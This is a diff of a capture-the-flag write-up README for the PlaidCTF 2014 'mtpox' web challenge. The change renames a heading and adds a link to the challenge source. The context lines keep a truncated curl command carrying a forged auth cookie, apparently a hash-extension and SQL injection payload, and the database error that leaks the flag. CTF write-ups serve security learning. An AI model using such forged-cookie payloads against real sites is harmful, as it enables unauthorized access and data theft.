@@ -276,8 +276,9 @@ $ curl --cookie 'auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0
 Query failed: Duplicate entry ':gcy:flag{phpPhPphpPPPphpcoin}:vup:1' for key 'group_key'
 ```
 
-## Other write-ups
+## Other write-ups and resources
 
 * <http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/>
 * <https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack>
 * <http://achatz.me/plaid-ctf-mt-pox/>
+* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/mtpox)
